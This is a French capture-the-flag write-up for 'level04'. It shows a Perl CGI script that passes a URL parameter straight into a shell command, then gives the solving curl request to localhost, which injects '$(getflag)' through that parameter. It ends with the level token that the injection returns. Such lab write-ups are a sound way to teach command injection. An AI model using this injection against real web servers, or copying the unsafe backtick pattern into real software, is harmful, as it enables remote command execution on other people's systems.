# Rapport CTF - [level04]

### Observation:
En arrivant sur le niveau on trouve un script perl nommé `level04.pl` qui a été créé par flag04 et donc a les droits d'utiliser des commandes en tant qu'utilisateur 'flag04'.

### Code:
On `cat` le script:
```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
$y = $_[0];
print `echo $y 2>&1`;
}
x(param("x"));
```

On peut voir que le code affiche la variable `y` qui est le premier argument de la liste `x`


### Solution :
Nous pouvons donc modifier la variable x pour exécuter des commandes: 
`curl http://localhost:4747/level04.pl?x=command`
Nous devons utiliser curl pour demander directement au serveur sans passer par l'exécutable pour avoir les drois de `flag04`.
`curl http://localhost:4747/level04.pl?x='$(getflag)'`

Nous obtenons donc directement le mot de passe de level05 sans avoir besoin de passer par flag04.

token : ne2searoevaevoem4ov4ar8ap
